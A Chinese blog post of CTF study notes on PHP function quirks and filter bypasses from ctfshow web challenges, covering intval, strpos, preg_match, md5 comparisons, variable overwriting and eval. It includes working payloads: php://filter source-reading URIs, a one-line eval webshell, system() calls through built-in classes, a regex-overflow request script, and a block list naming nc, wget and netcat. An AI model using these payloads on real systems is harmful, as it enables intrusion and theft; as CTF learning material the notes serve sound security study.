---
title: php特性
author: StarofEden
desc: 还没刷完，目前刷到139题
date: 2024.11.7
description: php代码审计
categories: 网络安全
---
# php特性

## php函数

* ==intval($var,$base)==

1. $var为数组时会返回1，$base为进制。` base=0`,则表示根据var开始的数字决定使用的进制。绕过：`8进制`：010574（0开头） `16进制`：0x117(0x开头)

2. 遇到**字母**或者**符号**停止读取

* ==strpos(string,find,start)==

  ![image-20241031204632014](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202410312046094.png)

  默认从0开始，有则<span alt="solid">返回第一次出现的位置</span>，无则返回false

  本例中若参数开头为0`?num=01110`    strpos函数会返回0并执行死亡程序

  绕过：<span alt="solid">参数中含有0但开头不能为0</span>
  
* ==highlight_file($_GET['u'])==
  
  <font>用php伪协议</font>

  > ```php
  > php://filter/resource=flag.php
  > php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php
  > php://filter/read=convert.quoted-printable-encode/resource=flag.php
  > compress.zlib://flag.php
  > Php://filter/zlib.deflate|zlib.inflate/resource=flag.php
  > ```
  
  参数u限制了不能等于flag.php,可用./flag.php
  或者?u=php://filter/read=convert.base64-encode/resource=flag.php
  
  
  
* ==in_array(search,array,type)==

type为TRUE则 函数还会检查 search的类型是否和 array中的相同

<span alt="solid">没有设置第3个参数则为弱类型比较</span>

![image-20241101132428315](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411011324381.png)
```php
?n=1.php   post:content=<?php @eval($_POST['a']); ?>
```

<details>
    <summary>蚁剑连接问题</summary>
    <p>出现错误：UNABLE_TO_VERIFY_LEAF_SIGNATURE</p>
    <p>其他设置-->勾选忽略HTTPS证书</p>
</details>
* ==file_put_contents==

1. 考虑插入一句话木马
2. 使用伪协议<span alt="solid">如果文件不存在，将创建一个文件 </span>，再写入查看源码的命令
3. 传入内容需要编码

```html
<?=`cat *`;
经过base64与16进制编码：
```

* ==call_user_func==

```php
<?php
function nowamagic($a,$b)   
{   
    echo $a;   
    echo $b;   
}   
call_user_func('nowamagic', "111","222");   
call_user_func('nowamagic', "333","444");   
//显示 111 222 333 444   
?>
```

```php
<?php
class a {   
    function b($c)   
    {   
        echo $c;   
    }   
}   
call_user_func(array("a", "b"),"111");   
//显示 111   
?>
```
_()是 gettext() 函数，一般是原封不动的输出参数
?f1=_&f2=get_defined_vars

![image-20241107094045219](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411070940375.png)

<details>
    <summary>遇到的坑</summary>
    <p>本来想post传参：ctfshow=array('ctfshow','getFlag')</p>
    <p>不成功，然后发现不能这样post数组</p>
</details>

> ctfshow[0]=ctfshow&ctfshow[1]=getFlag
> ctfshow=ctfshow::getFlag

* ==hex2bin()==
<span alt="solid">把十六进制值转换为 ASCII 字符</span>

把call_user_func()与hex2bin()结合起来？

* ==is_numeric()==

  1. 处理的数字有限制，所以一旦过长可能返回false；长度一般为18 
  2. 前面增加<kbd>\x0c</kbd>，<kbd>\f</kbd>，<kbd>%0c</kbd>`(url中)`可以通过
  ```php
  <?php
$num = "\x0c36";
if(is_numeric($num))
{
	echo "yes";
}
else echo "no";
?>          //yes
  ```

* web102

![image-20241101163549407](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411011635459.png)

v1需要post一个函数能对$s进行处理，这里post  hex2bin()

v2是读取源码的php代码，必须是数字，用科学计数法绕过

v3是用伪协议创建的文件
<details>
    <summary>遇到的坑</summary>
    <p>进过base64和hex之后，e后面必须全部为数字，所以要把=去掉</p>
    <p>访问2.php，右键查看网页源代码</p>
    <p>使用了伪协议后一般都要查看源码</p>
</details>

> payload:
>
> ?v2=115044383959474E6864434171594473&v3=php://filter/write=convert.base64-decode/resource=2.php
> post:v1=hex2bin

* ==die()==
  终止程序并输出括号内的提示信息
* ==is_file()==

if_file()能处理的长度有限，超过一点长度就不认为是文件

<font>/proc/self/root/</font>  代表根目录

```
/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php
```

* ==readfile()==

1. 使用php://filter   *中间的过滤器错误只会warning，不影响*

f=php://filter/ctfshow/resource=flag.php

2. 目录穿越

../../../var/www/html/flag.php

## 正则匹配绕过 

### preg_match
* ==m多行模式==

参数为数组时会报错返回0
==$== 匹配结尾位置 <!--如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’-->

```php
if(preg_match('/^php$/im', $a)) //m多行模式，某一行匹配到就通过
if(preg_match('/^php$/i', $a))  //单行模式，因为有个%0a换行符，则只在第一行匹配
```
绕过：aaa%0Aphp

https://blog.csdn.net/qq_46091464/article/details/108278486  Apache HTTPD 换行解析漏洞(CVE-2017-15715)与拓展

* ==传址==

![](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202410312155207.png)

最后一行为三元运算符，需要$_GET['HTTP_FLAG']=='flag'

`$_GET?$_GET=&$_POST:'flag'; `
使用==&==改变了get方法的地址，将get变成了post
payload:url随便传值，post:HTTP_FLAG=flag

解法2：post:flag=flag   cookie:HTTP_FLAG=flag

### ==ereg()==

1. 只能处理字符串，遇见数组返回null
2. 00截断   `a%00123`

### 溢出

当要匹配的字符串过长，正则表达式就会失效。默认最大长度是10万

```php
 if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    } 
```



```python
import requests
url="http://10f96bfc-6286-486a-9dd8-aff309362a7b.challenge.ctf.show"
str = 'very' * 250000 + '36Dctfshow'
print(len(str))
data = dict(f=str)
ret = requests.post(url, data=data).text

print(ret)
```
<details>
    <summary>遇到的坑</summary>
    <p>要将http改为https</p>
</details>

## ==
```php
if($num==4476){
        die("no no no!");
    } 
```
用`4476e123`可绕过。这里`e123`被当做科学计数法

如果限制了字母：

```php
if(preg_match("/[a-z]/i", $num)){
        die("no no no!");
    } 
```

可以用小数绕过：`4476.1` `+4476.1` 八进制：`010574 ` `%20010574`

* ==highlight_file($_GET['u'])==

  参数u限制了不能等于flag.php,可用./flag.php

## md5碰撞

* ==强比较==
1. 数组绕过：`a[]=1&b[]=2`
2. 不同明文相同MD5值
    a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2

## 获得类的信息
* ==var_dump==

var_dump能输出变量的信息，也可以输出类的信息

![image-20241101134132415](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411011341443.png)

<span alt="dotted">“=”赋值的优先级高于and</span>

eval执行php代码，payload:`?v1=1&v2=var_dump($ctfshow)/*&v3=*/;`

中间无效的字符串通过构造注释符号注释掉

### php内置类

*  ==ReflectionClass==建立反射类

反射类即类的映射

$class = new ReflectionClass('ctfshow');   建立ctfshow这个类的反射类

`?v1=1&v2=echo new ReflectionClass&v3=;`

不仅可以**映射类**，也可以**映射方法**。

注意：<span alt="wavy">中间的方法不需要加分号</span>

```php
<?php
	error_reporting(0);
	echo new ReflectionClass(system('ls')());
?>
```

`?v1=ReflectionClass&v2=system('cat *')`

> 类似还可以用:
>
> ?v1= CachingIterator&v2=system(ls)
> ?v1= DirectoryIterator&v2=system(ls)
> ?v1= Error&v2=system(ls)
> ?v1= Exception&v2=system(ls)

* 如果过滤了特殊符号

==FilesystemIterator()==:获取指定目录下的所有文件

==getcwd()==:获取当前路径

` ?v1=FilesystemIterator&v2=getcwd`

## 变量覆盖
* ==parse_str($v1,$v2)==

查询字符串解析到变量中

```php
 <?php
$v1="flag=111";
 parse_str($v1,$v2);
echo $v2['flag'];
?>         //输出111
```
* ==$_SERVER['argv']==

服务器查询字符串

> ?$fl0g=flag_give_me;
>
> fun=eval($a[0])

  相当于：eval($fl0g=flag_give_me;);**注意里面是一个变量赋值语句，要加分号**

或者使用`parse_str`解析变量

> ?a=1+fl0g=flag_give_me        post:fun=parse_str($a[1])

使用assert执行字符串中的 PHP 代码，不用加分号
> ?$fl0g=flag_give_me           fun=assert($a[0])


* 全局变量
如果有& 
函数内部无法调用外部的变量
`v2=GLOBALS`

### eval()与substr()
```php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    } 
```
> payload:?F=\`$F\`;+sleep(3)

### curl -F

> curl -F 将flag文件上传到Burp的 Collaborator Client 

## php变量过滤
1. 被get或者post传入的变量名，如果含有空格、+、[则会被转化为\_。如果传入[，它被转化为_之后，后面的字符就会被保留
   绕过：变量名如果有下划线可以`替换为[,%20,空格`
* ==extract()==
  使用数组键名作为变量名，使用数组键值作为变量值
  `extract($_POST)`可以将post的参数转化为变量

> ?\_POST[key1]=36d&\_POST[key2]=36d

  如果有`@parse_str($_SERVER['QUERY_STRING']); `就能转化为：
  $\_POST[key1]=36d
  $\_POST[key2]=36d
  再通过extract($_POST)转化为
  $key1=36d     $key2=36d


* ==绕过了很多打印符==

```php
if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16)
```
  > GET:?1=php://filter/convert.base64-encode/resource=flag.php
  > POST:fun=include$_GET[1]
  >
  > GET:?1=flag.php 
  > POST:&fun=highlight_file($\_GET[1])   
  >
  > fun=var_export(get_defined_vars())
  >
  > fun=highlight_file($_POST[1])&1=flag.php
  > 

## eval()命令执行

![image-20241107083421148](https://starofeden-blog.oss-cn-chengdu.aliyuncs.com/img/202411070834300.png)

* 分析

eval只执行前6个字符。传入==$F=\`$F\`;+sleep 3==就能执行整个内容

### 解题姿势

* 使用dnslog
  dnslog前缀太多就不会有显示，ctfshow上一直不成功,所以需要筛选一下

* 没有限制写文件
> \`$F\` ;nl flag.php>1.txt
> \`$F\` ;cp flag.php>1.txt 或 cp+flag.php+1.txt
> \`$F\` ;mv flag.php>1.txt

## exec()

**不会输出结果到标准输出**，而是将最后一行结果作为返回值返回；

* 将重定向到某个文件（>    tee)  `tee命令会覆盖指定文件`

> ls / | tee 1
>
> ls /flag | tee 2

## 小知识

1. windows系统中，url目录有多条斜杠不影响
1. 关注运算符==优先级==！（&&优先级高于||，“=”赋值的优先级高于and）